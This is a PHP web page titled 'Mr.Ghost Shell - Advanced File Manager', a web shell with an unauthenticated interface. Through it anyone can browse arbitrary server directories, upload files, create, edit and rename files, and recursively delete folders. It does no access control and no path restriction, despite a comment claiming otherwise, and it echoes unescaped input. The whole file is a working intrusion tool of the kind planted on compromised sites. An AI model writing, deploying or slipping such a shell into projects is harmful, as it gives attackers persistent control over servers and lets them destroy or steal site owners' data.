<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mr.Ghost Shell - Advanced File Manager</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #1e1e1e;
            color: #c7c7c7;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        h1 {
            color: #e74c3c;
            margin-top: 20px;
        }
        h2 {
            color: #4CAF50;
            margin-top: 10px;
        }
        a {
            color: #3498db;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        ul {
            list-style-type: none;
            padding: 0;
            width: 90%;
        }
        li {
            background-color: #2c2c2c;
            margin: 5px 0;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.5);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .delete-link {
            color: red;
            font-weight: bold;
        }
        .delete-link:hover {
            color: darkred;
        }
        .upload-form, .file-form, .folder-form {
            background-color: #2c2c2c;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.5);
            margin-top: 20px;
            width: 90%;
            text-align: center;
        }
        .upload-form input[type="file"],
        .file-form input[type="text"],
        .folder-form input[type="text"] {
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
            background-color: #1e1e1e;
            color: #c7c7c7;
            border: 1px solid #4CAF50;
        }
        .upload-form input[type="submit"],
        .file-form input[type="submit"],
        .folder-form input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .upload-form input[type="submit"]:hover,
        .file-form input[type="submit"]:hover,
        .folder-form input[type="submit"]:hover {
            background-color: #45a049;
        }
        .back-link, .latest-link {
            display: inline-block;
            color: #e74c3c;
            font-weight: bold;
            margin-bottom: 20px;
            cursor: pointer;
            font-size: 1.2rem;
        }
        .back-link:hover, .latest-link:hover {
            color: #c0392b;
        }
        .back-link::before {
            content: '⬅️ ';
        }
        .latest-link::before {
            content: '🏠 ';
        }
        .list-icons {
            margin-left: auto;
        }
        .edit-link, .rename-link {
            color: yellow;
            font-weight: bold;
        }
        .edit-link:hover, .rename-link:hover {
            color: orange;
        }
        .container {
            width: 100%;
            max-width: 1200px;
            padding: 20px;
        }
        .button-container {
            margin-bottom: 20px;
            text-align: left;
            width: 100%;
        }
        @media (max-width: 768px) {
            .container {
                width: 100%;
            }
            ul, .upload-form, .file-form, .folder-form {
                width: 100%;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Mr.Ghost Shell - Advanced File Manager</h1>

    <?php
    // Get the directory, default is the current directory
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

    // Normalize the directory path and prevent going above root
    $dir = realpath($dir);

    // Handle file deletion
    if (isset($_GET['delete'])) {
        $file_to_delete = $_GET['delete'];
        if (is_file($file_to_delete)) {
            unlink($file_to_delete);
            echo "<p style='color:green;'>File '$file_to_delete' deleted successfully.</p>";
        } elseif (is_dir($file_to_delete)) {
            rmdir_recursive($file_to_delete);
            echo "<p style='color:green;'>Folder '$file_to_delete' deleted successfully.</p>";
        }
    }

    // Recursive function to delete a folder and its contents
    function rmdir_recursive($dir) {
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $file_path = "$dir/$file";
            if (is_dir($file_path)) {
                rmdir_recursive($file_path);
            } else {
                unlink($file_path);
            }
        }
        rmdir($dir);
    }

    // Handle file upload
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
        $target_file = $dir . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "<p style='color:green;'>File uploaded successfully.</p>";
        } else {
            echo "<p style='color:red;'>Error uploading file.</p>";
        }
    }

    // Create new file
    if (isset($_POST['new_file'])) {
        $new_file_name = $dir . '/' . $_POST['new_file'];
        if (file_put_contents($new_file_name, '') !== false) {
            echo "<p style='color:green;'>File '$new_file_name' created successfully.</p>";
        } else {
            echo "<p style='color:red;'>Error creating file.</p>";
        }
    }

    // Create new folder
    if (isset($_POST['new_folder'])) {
        $new_folder_name = $dir . '/' . $_POST['new_folder'];
        if (mkdir($new_folder_name)) {
            echo "<p style='color:green;'>Folder '$new_folder_name' created successfully.</p>";
        } else {
            echo "<p style='color:red;'>Error creating folder.</p>";
        }
    }

    // Edit file content
    if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
        $file_to_edit = $dir . '/' . $_POST['edit_file'];
        if (is_file($file_to_edit)) {
            file_put_contents($file_to_edit, $_POST['file_content']);
            echo "<p style='color:green;'>File '$file_to_edit' edited successfully.</p>";
        }
    }

    // Rename file or folder
    if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $old_name = $dir . '/' . $_POST['old_name'];
        $new_name = $dir . '/' . $_POST['new_name'];
        if (rename($old_name, $new_name)) {
            echo "<p style='color:green;'>Renamed successfully from '$old_name' to '$new_name'.</p>";
        } else {
            echo "<p style='color:red;'>Error renaming.</p>";
        }
    }

    // Get the parent directory
    $parent_dir = dirname($dir);

    // Display the current directory and navigation links
    echo "<h2>Directory: $dir</h2>";
    echo "<div class='button-container'>";
    if ($dir != realpath('.')) {
        echo "<a href='?dir=$parent_dir' class='back-link'>Back to Previous Directory</a> | ";
    }
    echo "<a href='?dir=' class='latest-link'>Go to Root Directory</a>";
    echo "</div>";

    // List files and directories
    $files = scandir($dir);
    echo '<ul>';
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $full_path = "$dir/$file";
            echo '<li>';
            if (is_dir($full_path)) {
                // Directory
                echo "<a href='?dir=$full_path'>$file</a>";
            } else {
                // File
                echo "$file";
            }
            echo "<div class='list-icons'>";
            if (is_file($full_path)) {
                echo " | <a href='?dir=$dir&delete=$full_path' class='delete-link'>Delete</a>";
            } elseif (is_dir($full_path)) {
                echo " | <a href='?dir=$dir&delete=$full_path' class='delete-link'>Delete Folder</a>";
            }
            echo '</div></li>';
        }
    }
    echo '</ul>';
    ?>

    <!-- Upload file form -->
    <div class="upload-form">
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload File">
        </form>
    </div>

    <!-- Create new file form -->
    <div class="file-form">
        <form action="" method="post">
            <input type="text" name="new_file" placeholder="New File Name">
            <input type="submit" value="Create File">
        </form>
    </div>

    <!-- Create new folder form -->
    <div class="folder-form">
        <form action="" method="post">
            <input type="text" name="new_folder" placeholder="New Folder Name">
            <input type="submit" value="Create Folder">
        </form>
    </div>
</div>

</body>
</html>
